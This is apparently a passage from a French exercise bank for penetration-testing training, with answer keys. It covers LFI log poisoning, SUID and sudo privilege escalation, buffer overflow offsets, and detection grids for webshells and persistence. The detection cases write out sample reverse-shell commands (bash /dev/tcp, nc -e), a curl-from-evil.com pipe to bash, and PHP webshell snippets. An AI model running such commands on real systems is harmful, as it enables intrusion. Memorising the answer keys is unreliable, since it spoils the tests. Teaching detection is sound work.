        "expected": "path traversal||la traversée de répertoire||traversée de répertoire||lfi||l'inclusion de fichier local||inclusion de fichier local||local file inclusion"
      },
      {
        "label": "Question 2 — Fonction PHP en cause",
        "stdin": "q:2",
        "expected": "include||include()||require||require()"
      },
      {
        "label": "Question 3 — Technique d'exécution via les journaux",
        "stdin": "q:3",
        "expected": "log poisoning||le log poisoning||empoisonnement des journaux||l'empoisonnement des journaux"
      },
      {
        "label": "Question 4 — En-tête HTTP vecteur",
        "stdin": "q:4",
        "expected": "user-agent||le user-agent||user agent||l'en-tête user-agent"
      },
      {
        "label": "Question 5 — Étapes avant l'exécution",
        "stdin": "q:5",
        "expected": "3||trois"
      },
      {
        "label": "Question 6 — Remédiation par valeurs autorisées",
        "stdin": "q:6",
        "expected": "liste blanche||la liste blanche||whitelist||allowlist||liste d'autorisation"
      }
    ],
    "solution": "[Question 1 — Nom de la vulnérabilité initiale]\npath traversal\n\n[Question 2 — Fonction PHP typiquement en cause]\ninclude\n\n[Question 3 — Technique transformant la lecture en exécution]\nlog poisoning\n\n[Question 4 — En-tête HTTP vecteur de l'injection]\nuser-agent\n\n[Question 5 — Étapes entre la faille et la première exécution]\n3\n\n[Question 6 — Remédiation par liste de valeurs autorisées]\nliste blanche",
    "takeaway": "1) La vulnérabilité initiale est le path traversal (traversée de répertoire), qui permet de remonter l'arborescence jusqu'à /etc/passwd.\n2) La fonction PHP en cause est include (ou require), appelée avec le paramètre page sans validation.\n3) La technique s'appelle le log poisoning : du code PHP injecté dans un journal est ensuite exécuté par l'inclusion de ce journal.\n4) L'en-tête User-Agent a servi de vecteur : sa valeur est consignée dans le journal d'accès.\n5) Il faut 3 étapes pour passer de la faille (étape 1) à la première exécution de code (étape 4).\n6) La remédiation est la liste blanche : ne charger que des pages présentes dans un répertoire ou un tableau de valeurs autorisées.\nContrôle : lecture (2), dépôt (3), exécution (4) : trois étapes suffisent à transformer une simple divulgation en exécution de code, d'où la gravité CVSS élevée de ce type de faille."
  },
  {
    "id": "hk3-c5-e1",
    "chapter": 5,
    "level": "n1",
    "language": "analyse",
    "title": "L'audit des binaires SUID du serveur de la coopérative Solvigne",
    "exampleTitle": "Exemple résolu — les binaires SUID de l'école de musique Harmonia",
    "goal": "Interpréter la sortie d'une recherche de binaires SUID et repérer ceux qui ouvrent un shell root.",
    "brief": "<p><strong>Énoncé.</strong> La coopérative agricole Solvigne mandate un test d'intrusion de son serveur web. Après avoir obtenu un accès limité au compte <code>www-data</code>, l'auditeur recherche des chemins d'élévation de privilèges et lance <code>find / -perm -4000 -type f 2&gt;/dev/null</code>. Le serveur renvoie :</p><table><tr><th>Binaire</th><th>Permissions</th></tr><tr><th>/usr/bin/passwd</th><td>-rwsr-xr-x root root</td></tr><tr><th>/usr/bin/find</th><td>-rwsr-xr-x root root</td></tr><tr><th>/usr/bin/vim</th><td>-rwsr-xr-x root root</td></tr><tr><th>/usr/bin/less</th><td>-rwsr-xr-x root root</td></tr><tr><th>/bin/mount</th><td>-rwsr-xr-x root root</td></tr><tr><th>/usr/bin/chsh</th><td>-rwsr-xr-x root root</td></tr></table><p>Au passage, la base GTFOBins indique que <code>find</code>, <code>vim</code> et <code>less</code> permettent d'ouvrir un shell lorsque leur bit SUID est positionné.</p><ol><li>Combien de binaires SUID l'audit a-t-il listés ?</li><li>Quelle lettre minuscule, à la place du « x » du propriétaire dans la chaîne de permissions, signale le bit SUID ?</li><li>Combien de ces binaires GTFOBins considère-t-elle comme permettant un shell root ?</li><li>Quel binaire est légitimement SUID sur tout système Linux car il modifie les mots de passe ?</li><li>Quelle valeur octale, présente dans l'option -perm de la commande, correspond au bit SUID ?</li><li>Sous quelle identité ces binaires s'exécutent-ils grâce au bit SUID ?</li></ol>",
    "starter": "# Exercice — L'audit des binaires SUID du serveur de la coopérative Solvigne\n# Lisez l'énoncé complet ci-dessus, puis répondez à chaque question dans son bloc.\n# Questions 1, 3 et 5 : un nombre. Question 2 : une lettre. Questions 4 et 6 : un nom.\n\n[Question 1 — Binaires SUID listés]\nA_COMPLETER\n\n[Question 2 — Lettre signalant le bit SUID]\nA_COMPLETER\n\n[Question 3 — Binaires ouvrant un shell selon GTFOBins]\nA_COMPLETER\n\n[Question 4 — Binaire SUID légitime]\nA_COMPLETER\n\n[Question 5 — Valeur octale du bit SUID]\nA_COMPLETER\n\n[Question 6 — Identité d'exécution des binaires SUID]\nA_COMPLETER\n",
    "hints": [
      "Comptez les lignes du tableau : chaque binaire listé porte le bit SUID dans ses permissions.",
      "Dans -rwsr-xr-x, le « s » remplace le « x » du propriétaire : c'est lui qui indique le SUID ; la commande le cherche avec -perm -4000.",
      "GTFOBins classe find, vim et less comme permettant un shell ; passwd est SUID par conception, pour que tout utilisateur change son mot de passe."
    ],
    "examples": [
      {
        "stdin": "Le serveur de l'école de musique Harmonia renvoie quatre binaires SUID :\npasswd (légitime), nano, awk, env.\nGTFOBins classe nano, awk et env comme permettant d'ouvrir un shell.\n\n1) 4 binaires listés. 2) Le bit SUID se lit « s » à la place du x du propriétaire.\n3) 3 binaires exploitables. 4) passwd est le SUID légitime. 5) Valeur octale : 4000. 6) Les binaires s'exécutent en root.",
        "expected": "4 binaires — s — 3 exploitables — passwd — 4000 — root",
        "note": "Un SUID légitime comme passwd ne doit jamais être supprimé : l'audit ne retient que les SUID injustifiés."
      }
    ],
    "tests": [
      {
        "label": "Question 1 — Binaires SUID listés",
        "stdin": "q:1",
        "expected": "6||six"
      },
      {
        "label": "Question 2 — Lettre du bit SUID",
        "stdin": "q:2",
        "expected": "s||la lettre s"
      },
      {
        "label": "Question 3 — Binaires ouvrant un shell",
        "stdin": "q:3",
        "expected": "3||trois"
      },
      {
        "label": "Question 4 — Binaire SUID légitime",
        "stdin": "q:4",
        "expected": "passwd||le passwd||/usr/bin/passwd"
      },
      {
        "label": "Question 5 — Valeur octale du SUID",
        "stdin": "q:5",
        "expected": "4000"
      },
      {
        "label": "Question 6 — Identité d'exécution",
        "stdin": "q:6",
        "expected": "root||le root||l'utilisateur root"
      }
    ],
    "solution": "[Question 1 — Binaires SUID listés]\n6\n\n[Question 2 — Lettre signalant le bit SUID]\ns\n\n[Question 3 — Binaires ouvrant un shell selon GTFOBins]\n3\n\n[Question 4 — Binaire SUID légitime]\npasswd\n\n[Question 5 — Valeur octale du bit SUID]\n4000\n\n[Question 6 — Identité d'exécution des binaires SUID]\nroot",
    "takeaway": "1) La commande a listé 6 binaires SUID : passwd, find, vim, less, mount et chsh.\n2) La lettre « s » remplace le « x » du propriétaire dans -rwsr-xr-x : c'est le signe du bit SUID.\n3) GTFOBins classe 3 de ces binaires comme permettant un shell root : find, vim et less.\n4) passwd est légitimement SUID sur tout système Linux : il doit modifier les mots de passe pour tous les utilisateurs.\n5) Le bit SUID correspond à la valeur octale 4000, d'où l'option -perm -4000 de la commande.\n6) Grâce au bit SUID, ces binaires s'exécutent sous l'identité de root, quel que soit l'utilisateur qui les lance.\nContrôle : 6 binaires listés − 3 exploitables (find, vim, less) − 2 légitimes (passwd, chsh) = 1 binaire à instruire (mount), le tri de l'auditeur est complet."
  },
  {
    "id": "hk3-c5-e2",
    "chapter": 5,
    "level": "n2",
    "language": "analyse",
    "title": "Le fichier sudoers du serveur de l'agence Weblane",
    "exampleTitle": "Exemple résolu — le sudoers de la clinique Bonne-Fontaine",
    "goal": "Auditer un extrait de fichier sudoers et compter les règles qui mènent à un shell root.",
    "brief": "<p><strong>Énoncé.</strong> L'agence web Weblane fait tester son serveur de préproduction. Disposant du compte <code>dev</code>, l'auditeur lance <code>sudo -l</code> et obtient l'extrait de configuration suivant :</p><table><tr><th>Ligne du fichier sudoers</th><th>Portée</th></tr><tr><th>webmaster ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart apache2</th><td>Redémarrer le service web</td></tr><tr><th>dev ALL=(ALL:ALL) NOPASSWD: /usr/bin/vim /etc/apache2/apache2.conf</td><td>Éditer la configuration Apache</td></tr><tr><th>stagiaire ALL=(ALL) NOPASSWD: /usr/bin/less /var/log/syslog</td><td>Consulter le journal système</td></tr><tr><th>admin ALL=(ALL:ALL) ALL</th><td>Toutes les commandes, avec mot de passe</td></tr></table><p>La base GTFOBins rappelle que <code>vim</code> et <code>less</code> savent lancer un shell.</p><ol><li>Combien d'utilisateurs ces quatre lignes concernent-elles ?</li><li>Combien de lignes autorisent des commandes sans mot de passe (NOPASSWD) ?</li><li>Quel utilisateur peut sortir de vim avec un shell root ?</li><li>Quel pagineur du stagiaire exécute une commande via le séquenceur « !sh » ?</li><li>Combien de règles mènent à un shell root ?</li><li>Quel utilisateur garde le droit le plus large tout en restant protégé par la demande de mot de passe ?</li></ol>",
    "starter": "# Exercice — Le fichier sudoers du serveur de l'agence Weblane\n# Lisez l'énoncé complet ci-dessus, puis répondez à chaque question dans son bloc.\n# Questions 1, 2 et 5 : un nombre. Questions 3, 4 et 6 : un nom d'utilisateur ou de binaire.\n\n[Question 1 — Utilisateurs concernés]\nA_COMPLETER\n\n[Question 2 — Lignes NOPASSWD]\nA_COMPLETER\n\n[Question 3 — Utilisateur pouvant sortir de vim en shell root]\nA_COMPLETER\n\n[Question 4 — Pagineur du stagiaire exécutant !sh]\nA_COMPLETER\n\n[Question 5 — Règles menant à un shell root]\nA_COMPLETER\n\n[Question 6 — Utilisateur au droit large protégé par mot de passe]\nA_COMPLETER\n",
    "hints": [
      "Listez les utilisateurs en tête de chaque ligne : chaque ligne du tableau en concerne un ; NOPASSWD se compte ensuite dans les trois premières.",
      "GTFOBins signale vim et less : identifiez qui a le droit de lancer chacun d'eux via sudo.",
      "La dernière ligne donne tous les droits mais exige le mot de passe : c'est le seul garde-fou qui reste."
    ],
    "examples": [
      {
        "stdin": "Le serveur de la clinique Bonne-Fontaine expose via sudo -l :\ndeploy NOPASSWD: /usr/bin/systemctl restart app ;\nchef NOPASSWD: /usr/bin/awk /etc/app.conf ;\nop NOPASSWD: /usr/bin/man ;\nbackup ALL=(ALL:ALL) ALL.\nGTFOBins : awk et man savent lancer un shell.\n\n1) 4 utilisateurs. 2) 3 lignes NOPASSWD. 3) L'utilisateur chef obtient un shell via awk.\n4) Le pagineur man sert à op. 5) 2 règles mènent à un shell. 6) L'utilisateur backup garde le droit le plus large protégé par mot de passe.",
        "expected": "4 utilisateurs — 3 NOPASSWD — chef via awk — man pour op — 2 règles — backup",
        "note": "Même un outil d'administration anodin (man, less) devient une porte dérobée dès qu'il s'exécute via sudo."
      }
    ],
    "tests": [
      {
        "label": "Question 1 — Utilisateurs concernés",
        "stdin": "q:1",
        "expected": "4||quatre"
      },
      {
        "label": "Question 2 — Lignes NOPASSWD",
        "stdin": "q:2",
        "expected": "3||trois"
      },
      {
        "label": "Question 3 — Utilisateur du vim",
        "stdin": "q:3",
        "expected": "dev||l'utilisateur dev||le compte dev"
      },
      {
        "label": "Question 4 — Pagineur du stagiaire",
        "stdin": "q:4",
        "expected": "less||le less"
      },
      {
        "label": "Question 5 — Règles menant à un shell root",
        "stdin": "q:5",
        "expected": "2||deux"
      },
      {
        "label": "Question 6 — Utilisateur protégé par mot de passe",
        "stdin": "q:6",
        "expected": "admin||l'utilisateur admin||le compte admin"
      }
    ],
    "solution": "[Question 1 — Utilisateurs concernés]\n4\n\n[Question 2 — Lignes NOPASSWD]\n3\n\n[Question 3 — Utilisateur pouvant sortir de vim en shell root]\ndev\n\n[Question 4 — Pagineur du stagiaire exécutant !sh]\nless\n\n[Question 5 — Règles menant à un shell root]\n2\n\n[Question 6 — Utilisateur au droit large protégé par mot de passe]\nadmin",
    "takeaway": "1) Les quatre lignes concernent 4 utilisateurs : webmaster, dev, stagiaire et admin.\n2) Trois lignes portent NOPASSWD : celles de webmaster, dev et stagiaire.\n3) L'utilisateur dev peut lancer vim via sudo, et vim sait ouvrir un shell root (:!sh).\n4) Le stagiaire a le droit de lancer less, qui exécute une commande via le séquenceur « !sh ».\n5) Deux règles mènent à un shell root : celle de dev (vim) et celle du stagiaire (less).\n6) L'utilisateur admin conserve toutes les commandes mais avec demande de mot de passe : c'est le seul droit large encore protégé.\nContrôle : 4 utilisateurs, 3 sans mot de passe, dont 2 via des outils shell-capables selon GTFOBins : la configuration cumule les facteurs de risque."
  },
  {
    "id": "hk3-c5-e3",
    "chapter": 5,
    "level": "n3",
    "language": "analyse",
    "title": "L'écrasement de l'adresse de retour du service borne de Navik",
    "exampleTitle": "Exemple résolu — l'offset du service chat_v1",
    "goal": "Calculer les offsets d'un dépassement de tampon sur pile : tampon, EBP, adresse de retour et place restante.",
    "brief": "<p><strong>Énoncé.</strong> Au CTF inter-écoles de Navik, l'épreuve « borne » fournit le binaire d'un service qui lit une chaîne saisie au clavier. L'analyse du code désassemblé montre un tampon de <strong>250 octets</strong>, suivi de l'adresse de retour de la fonction : les 4 octets de l'EBP sauvegardé précèdent immédiatement cette adresse. L'équipe étudiante prépare son exploit :</p><ol><li>Quelle est la taille du tampon vulnérable, en octets ?</li><li>À quel offset, compté depuis le début du tampon, l'adresse de retour commence-t-elle à être écrasée ?</li><li>Combien d'octets séparent la fin du tampon du début de l'adresse de retour ?</li><li>L'équipe envoie une entrée de 400 octets : combien d'octets restent après l'adresse de retour ?</li><li>Quel registre 32 bits, contenant l'adresse de la prochaine instruction à exécuter, l'écrasement détourne-t-il ?</li><li>Quelle protection du compilateur insère une valeur secrète entre le tampon et l'adresse de retour pour détecter l'écrasement ?</li></ol>",
    "starter": "# Exercice — L'écrasement de l'adresse de retour du service borne de Navik\n# Lisez l'énoncé complet ci-dessus, puis répondez à chaque question dans son bloc.\n# Questions 1 à 4 : un nombre d'octets ou un offset. Question 5 : un registre. Question 6 : une protection.\n\n[Question 1 — Taille du tampon vulnérable]\nA_COMPLETER\n\n[Question 2 — Offset d'écrasement de l'adresse de retour]\nA_COMPLETER\n\n[Question 3 — Octets entre le tampon et l'adresse de retour]\nA_COMPLETER\n\n[Question 4 — Octets restants après l'adresse de retour]\nA_COMPLETER\n\n[Question 5 — Registre 32 bits détourné]\nA_COMPLETER\n\n[Question 6 — Protection par valeur secrète]\nA_COMPLETER\n",
    "hints": [
      "Sur la pile, l'ordre est : tampon, puis EBP sauvegardé (4 octets), puis l'adresse de retour ; l'offset de l'adresse de retour est donc la taille du tampon plus 4.",
      "Pour la place restante, retirez de l'entrée totale l'offset de l'adresse de retour puis ses 4 octets.",
      "Le registre qui porte l'adresse de la prochaine instruction s'appelle EIP en architecture 32 bits ; la protection qui insère une valeur secrète s'appelle le canari de pile (stack canary)."
    ],
    "examples": [
      {
        "stdin": "L'épreuve chat_v1 du même CTF expose un tampon de 120 octets,\nsuivi de l'EBP sauvegardé (4 octets) puis de l'adresse de retour.\n\n1) Tampon : 120 octets. 2) L'adresse de retour est écrasée à l'offset 120 + 4 = 124.\n3) 4 octets (l'EBP) séparent le tampon de l'adresse de retour.\n4) Sur une entrée de 200 octets, il reste 200 − 124 − 4 = 72 octets après l'adresse de retour.\n5) Le registre détourné est EIP. 6) La protection s'appelle le canari de pile (stack canary).",
        "expected": "tampon 120 — offset 124 — 4 octets — 72 octets après EIP — EIP — le canari",
        "note": "L'offset 124 = 120 + 4 : les 4 octets de l'EBP sauvegardé se placent toujours entre le tampon et l'adresse de retour."
      }
    ],
    "tests": [
      {
        "label": "Question 1 — Taille du tampon",
        "stdin": "q:1",
        "expected": "250"
      },
      {
        "label": "Question 2 — Offset de l'adresse de retour",
        "stdin": "q:2",
        "expected": "254"
      },
      {
        "label": "Question 3 — Octets entre tampon et adresse",
        "stdin": "q:3",
        "expected": "4||quatre"
      },
      {
        "label": "Question 4 — Octets restants après l'adresse",
        "stdin": "q:4",
        "expected": "142"
      },
      {
        "label": "Question 5 — Registre détourné",
        "stdin": "q:5",
        "expected": "eip||le registre eip||EIP"
      },
      {
        "label": "Question 6 — Protection par valeur secrète",
        "stdin": "q:6",
        "expected": "le canari||canari||canary||stack canary||la protection canary||stack protector||ssp"
      }
    ],
    "solution": "[Question 1 — Taille du tampon vulnérable]\n250\n\n[Question 2 — Offset d'écrasement de l'adresse de retour]\n254\n\n[Question 3 — Octets entre le tampon et l'adresse de retour]\n4\n\n[Question 4 — Octets restants après l'adresse de retour]\n142\n\n[Question 5 — Registre 32 bits détourné]\neip\n\n[Question 6 — Protection par valeur secrète]\nle canari",
    "takeaway": "1) Le tampon vulnérable fait 250 octets.\n2) L'adresse de retour commence à l'offset 250 + 4 = 254 depuis le début du tampon.\n3) Les 4 octets de l'EBP sauvegardé séparent la fin du tampon du début de l'adresse de retour.\n4) Sur une entrée de 400 octets : 400 − 254 − 4 = 142 octets restent après l'adresse de retour.\n5) L'écrasement détourne EIP, le registre qui pointe vers la prochaine instruction à exécuter.\n6) La protection s'appelle le canari de pile (stack canary) : une valeur secrète insérée entre le tampon et l'adresse de retour, vérifiée avant le retour de fonction.\nContrôle : 250 (tampon) + 4 (EBP) + 4 (adresse de retour) + 142 (reste) = 400 octets envoyés, la comptabilité de l'exploit est exacte."
  },
  {
    "id": "hk3-c6-e1",
    "chapter": 6,
    "title": "Recherche illustrative de signatures textuelles",
    "level": "n1",
    "language": "analyse",
    "goal": "Relever des familles de chaînes sans certifier la nature ou le risque d’un script.",
    "brief": "<p>Ce modèle recherche uniquement des chaînes littérales et additionne une fois chaque famille présente : commandes (<code>system</code>, <code>passthru</code>, <code>shell_exec</code>, <code>popen</code>) +40 ; évaluation (<code>eval</code>, <code>assert</code>) +30 ; transformations (<code>base64_decode</code>, <code>gzinflate</code>, <code>str_rot13</code>) +20 ; entrées (<code>$_GET</code>, <code>$_POST</code>, <code>$_REQUEST</code>) +20. Le score et les seuils sont fictifs : une correspondance n’établit pas une malveillance et l’absence d’indice ne prouve pas l’innocuité. Une analyse complémentaire est nécessaire.</p><p>Pour <code>SCAN_SCRIPT code=&lt;texte&gt;</code>, afficher <code>WEBSHELL_SCAN: score=&lt;n&gt; status=&lt;INDICES_FORTS|INDICES|AUCUN_INDICE&gt; risk=NON_EVALUE</code> : INDICES_FORTS à partir de 60, INDICES de 20 à 59, AUCUN_INDICE en dessous de 20.</p>",
    "starter": "# Grille d'analyse (hk3-c6-e1) — Recherche illustrative de signatures textuelles\n# Complétez la réponse attendue sous chaque cas ci-dessous :\n\n[Cas 1 — Trois familles textuelles]\n# Données : SCAN_SCRIPT code=<?php eval(base64_decode($_POST[\"payload\"])); ?>\nA_COMPLETER\n\n[Cas 2 — Une seule famille textuelle]\n# Données : SCAN_SCRIPT code=<?php $logo = base64_decode(\"iVBORw0KGgoAAAANSUhEUg==\"); ?>\nA_COMPLETER\n\n[Cas 3 — Aucune des chaînes recherchées]\n# Données : SCAN_SCRIPT code=<?php echo \"<h1>Bienvenue sur le portail</h1>\"; ?>\nA_COMPLETER\n",
    "hints": [
      "Compter chaque famille au maximum une fois.",
      "Le résultat ne classe pas le script comme bénin ou malveillant.",
      "Additionnez les points des signatures de fonctions sensibles détectées sans jamais conclure automatiquement à la malveillance réelle du fichier."
    ],
    "examples": [
      {
        "stdin": "SCAN_SCRIPT code=<?php if(isset($_REQUEST[\"cmd\"])){ system($_REQUEST[\"cmd\"]); } ?>",
        "expected": "WEBSHELL_SCAN: score=60 status=INDICES_FORTS risk=NON_EVALUE",
        "note": "Deux familles sont présentes dans le texte ; le score ne remplace pas l’analyse."
      }
    ],
    "tests": [
      {
        "label": "Trois familles textuelles",
        "stdin": "cas:1",
        "expected": "WEBSHELL_SCAN: score=70 status=INDICES_FORTS risk=NON_EVALUE"
      },
      {
        "label": "Une seule famille textuelle",
        "stdin": "cas:2",
        "expected": "WEBSHELL_SCAN: score=20 status=INDICES risk=NON_EVALUE"
      },
      {
        "label": "Aucune des chaînes recherchées",
        "stdin": "cas:3",
        "expected": "WEBSHELL_SCAN: score=0 status=AUCUN_INDICE risk=NON_EVALUE"
      }
    ],
    "solution": "[Exemple]\nWEBSHELL_SCAN: score=60 status=INDICES_FORTS risk=NON_EVALUE\n\n[Cas 1 — Trois familles textuelles]\nWEBSHELL_SCAN: score=70 status=INDICES_FORTS risk=NON_EVALUE\n\n[Cas 2 — Une seule famille textuelle]\nWEBSHELL_SCAN: score=20 status=INDICES risk=NON_EVALUE\n\n[Cas 3 — Aucune des chaînes recherchées]\nWEBSHELL_SCAN: score=0 status=AUCUN_INDICE risk=NON_EVALUE\n",
    "takeaway": "À retenir : Relever des familles de chaînes sans certifier la nature ou le risque d’un script.\nRepère : Deux familles sont présentes dans le texte ; le score ne remplace pas l’analyse."
  },
  {
    "id": "hk3-c6-e2",
    "chapter": 6,
    "title": "Recherche de motifs de persistance Linux",
    "level": "n2",
    "language": "analyse",
    "goal": "Repérer des motifs textuels associés à des techniques de persistance, sans conclure sur leur intention ou leur risque.",
    "brief": "<p>Une tâche planifiée ou un script de démarrage peut être utilisé pour maintenir un accès. Cette grille recherche uniquement quatre motifs textuels dans une commande ; elle ne lance aucune commande.<br><br>\nMotifs recherchés, par ordre de priorité :<br>\n1. <code>BASH_REVERSE_SHELL</code> : contient <code>/dev/tcp/</code> ou <code>bash -i</code>.<br>\n2. <code>NETCAT_REVERSE_SHELL</code> : contient <code>nc -e</code>, <code>ncat -e</code> ou <code>nc.traditional</code>.<br>\n3. <code>DOWNLOAD_EXECUTE</code> : contient <code>curl</code> ou <code>wget</code> suivi de <code>| sh</code> ou <code>| bash</code>.<br>\n4. <code>PYTHON_SOCKET_SHELL</code> : contient <code>python -c</code> et <code>socket</code>.<br><br>\nIndiquez le premier motif trouvé, ou <code>signature=AUCUNE_CORRESPONDANCE</code> si aucun ne correspond. Une correspondance ne prouve ni l'intention malveillante ni le niveau de risque ; son absence ne prouve pas non plus l'innocuité. Dans les deux cas, renseignez <code>malicious=NON_EVALUE</code> et <code>risk=NON_EVALUE</code> : une analyse complémentaire est nécessaire.<br><br>\nDonnées du cas : <code>PERSIST_AUDIT type=&lt;CRON|SERVICE|SCRIPT&gt; command=&lt;commande&gt;</code>.<br>\nRésultat d’analyse attendu : <code>PERSIST_RESULT: type=&lt;type&gt; malicious=NON_EVALUE signature=&lt;sig&gt; risk=NON_EVALUE</code>.</p>",
    "starter": "# Grille d'analyse (hk3-c6-e2) — Recherche de motifs de persistance Linux\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Reverse shell netcat avec redirection de binaire shell]\n# Données : PERSIST_AUDIT type=SERVICE command=ExecStart=/bin/nc -e /bin/sh 192.168.1.100 9001\nA_COMPLETER\n\n[Cas 2 — Persistance par téléchargement et exécution de script distant]\n# Données : PERSIST_AUDIT type=CRON command=@reboot curl -s http://evil.com/implant.sh | bash\nA_COMPLETER\n\n[Cas 3 — Tâche cron de sauvegarde et synchronisation]\n# Données : PERSIST_AUDIT type=CRON command=0 2 * * * /usr/bin/rsync -avz /data /backup\nA_COMPLETER\n",
    "hints": [
      "Repérez le type après type= et la commande après command=.",
      "Testez les motifs BASH_REVERSE_SHELL, NETCAT_REVERSE_SHELL, DOWNLOAD_EXECUTE, PYTHON_SOCKET_SHELL.",
      "Formatez la sortie PERSIST_RESULT."
    ],
    "examples": [
      {
        "stdin": "PERSIST_AUDIT type=CRON command=* * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "expected": "PERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=BASH_REVERSE_SHELL risk=NON_EVALUE",
        "note": "La commande contient les motifs textuels de la famille BASH_REVERSE_SHELL."
      }
    ],
    "tests": [
      {
        "label": "Reverse shell netcat avec redirection de binaire shell",
        "stdin": "cas:1",
        "expected": "PERSIST_RESULT: type=SERVICE malicious=NON_EVALUE signature=NETCAT_REVERSE_SHELL risk=NON_EVALUE"
      },
      {
        "label": "Persistance par téléchargement et exécution de script distant",
        "stdin": "cas:2",
        "expected": "PERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=DOWNLOAD_EXECUTE risk=NON_EVALUE"
      },
      {
        "label": "Tâche cron de sauvegarde et synchronisation",
        "stdin": "cas:3",
        "expected": "PERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=AUCUNE_CORRESPONDANCE risk=NON_EVALUE"
      }
    ],
    "solution": "[Exemple]\nPERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=BASH_REVERSE_SHELL risk=NON_EVALUE\n\n[Cas 1 — Reverse shell netcat avec redirection de binaire shell]\nPERSIST_RESULT: type=SERVICE malicious=NON_EVALUE signature=NETCAT_REVERSE_SHELL risk=NON_EVALUE\n\n[Cas 2 — Persistance par téléchargement et exécution de script distant]\nPERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=DOWNLOAD_EXECUTE risk=NON_EVALUE\n\n[Cas 3 — Tâche cron de sauvegarde et synchronisation]\nPERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=AUCUNE_CORRESPONDANCE risk=NON_EVALUE",
    "takeaway": "À retenir : Repérer des motifs textuels associés à des techniques de persistance, sans conclure sur leur intention ou leur risque.\nRepère : La commande contient les motifs textuels de la famille BASH_REVERSE_SHELL."
  },
  {
    "id": "hk3-c6-e3",
    "chapter": 6,
    "level": "n3",
    "language": "analyse",
    "title": "La matrice des risques du rapport de l'hôpital Ventalis",
    "exampleTitle": "Exemple résolu — le rapport de la bibliothèque de Sanzel",
    "goal": "Exploiter la table des vulnérabilités d'un rapport de pentest pour prioriser la remédiation et rédiger la synthèse.",
    "brief": "<p><strong>Énoncé.</strong> Le test d'intrusion de l'hôpital privé Ventalis touche à sa fin : l'auditeur consigne dans son rapport les cinq vulnérabilités retenues et prépare la restitution :</p><table><tr><th>Vulnérabilité</th><th>Score CVSS</th><th>Sévérité</th></tr><tr><th>Injection SQL sur le portail patient</th><td>9,8</td><td>Critique</td></tr><tr><th>IDOR sur les factures</th><td>8,6</td><td>Élevée</td></tr><tr><th>XSS stocké dans la messagerie interne</th><td>6,1</td><td>Moyenne</td></tr><tr><th>Absence d'en-tête HSTS</th><td>5,9</td><td>Moyenne</td></tr><tr><th>Divulgation de la version du serveur</th><td>3,1</td><td>Faible</td></tr></table><ol><li>Combien de vulnérabilités le rapport recense-t-il ?</li><li>Combien sont de sévérité moyenne ?</li><li>Quel est le score CVSS de la vulnérabilité à traiter en priorité absolue ?</li><li>Quel est le score de la deuxième vulnérabilité la plus grave ?</li><li>Quelle section du rapport, destinée à la direction, résume les risques sans jargon technique ?</li><li>Quelle vulnérabilité occupe la deuxième ligne du plan de remédiation : l'IDOR, le XSS, l'absence de HSTS ou la divulgation de version ?</li></ol>",
    "starter": "# Exercice — La matrice des risques du rapport de l'hôpital Ventalis\n# Lisez l'énoncé complet ci-dessus, puis répondez à chaque question dans son bloc.\n# Questions 1 et 2 : un nombre. Questions 3 et 4 : un score. Questions 5 et 6 : un terme.\n\n[Question 1 — Vulnérabilités recensées]\nA_COMPLETER\n\n[Question 2 — Vulnérabilités de sévérité moyenne]\nA_COMPLETER\n\n[Question 3 — Score de la priorité absolue]\nA_COMPLETER\n\n[Question 4 — Score de la deuxième vulnérabilité la plus grave]\nA_COMPLETER\n\n[Question 5 — Section du rapport destinée à la direction]\nA_COMPLETER\n\n[Question 6 — Deuxième vulnérabilité du plan de remédiation]\nA_COMPLETER\n",
    "hints": [
      "Parcourez la colonne Sévérité : les moyennes se comptent ligne par ligne ; les scores se rangent par ordre décroissant pour la priorisation.",
      "La priorité absolue va au score le plus élevé ; la deuxième ligne suit immédiatement ce score dans le classement.",
      "Le rapport destiné à un public non technique porte un nom normalisé : la synthèse (ou résumé) exécutive, placée en tête du document."
    ],
    "examples": [
      {
        "stdin": "Le rapport du pentest de la bibliothèque de Sanzel retient :\nRCE sur le module d'import (9,1 — critique) ; injection SQL (8,8 — élevée) ;\nabsence de double authentification (7,5 — élevée) ; CSRF sur le formulaire d'inscription (4,3 — moyenne) ;\nlisting de répertoire (3,7 — faible).\n\n1) 5 vulnérabilités. 2) 1 seule de sévérité moyenne (le CSRF). 3) Priorité absolue : score 9,1.\n4) Deuxième score : 8,8. 5) Section pour la direction : la synthèse exécutive. 6) Deuxième du plan : l'injection SQL.",
        "expected": "5 vulnérabilités — 1 moyenne — 9,1 — 8,8 — synthèse exécutive — l'injection SQL",
        "note": "Le plan de remédiation suit l'ordre des scores décroissants : 9,1 puis 8,8 puis 7,5, les sévérités ne servent qu'à communiquer."
      }
    ],
    "tests": [
      {
        "label": "Question 1 — Vulnérabilités recensées",
        "stdin": "q:1",
        "expected": "5||cinq"
      },
      {
        "label": "Question 2 — Sévérité moyenne",
        "stdin": "q:2",
        "expected": "2||deux"
      },
      {
        "label": "Question 3 — Score de la priorité absolue",
        "stdin": "q:3",
        "expected": "9,8||9.8"
      },
      {
        "label": "Question 4 — Deuxième score le plus grave",
        "stdin": "q:4",
        "expected": "8,6||8.6"
      },
      {
        "label": "Question 5 — Section pour la direction",
        "stdin": "q:5",
        "expected": "la synthèse exécutive||synthèse exécutive||le résumé exécutif||résumé exécutif||executive summary"
      },
      {
        "label": "Question 6 — Deuxième du plan de remédiation",
        "stdin": "q:6",
        "expected": "l'idor||idor||l'idor sur les factures"
      }
    ],
    "solution": "[Question 1 — Vulnérabilités recensées]\n5\n\n[Question 2 — Vulnérabilités de sévérité moyenne]\n2\n\n[Question 3 — Score de la priorité absolue]\n9,8\n\n[Question 4 — Score de la deuxième vulnérabilité la plus grave]\n8,6\n\n[Question 5 — Section du rapport destinée à la direction]\nla synthèse exécutive\n\n[Question 6 — Deuxième vulnérabilité du plan de remédiation]\nl'idor",
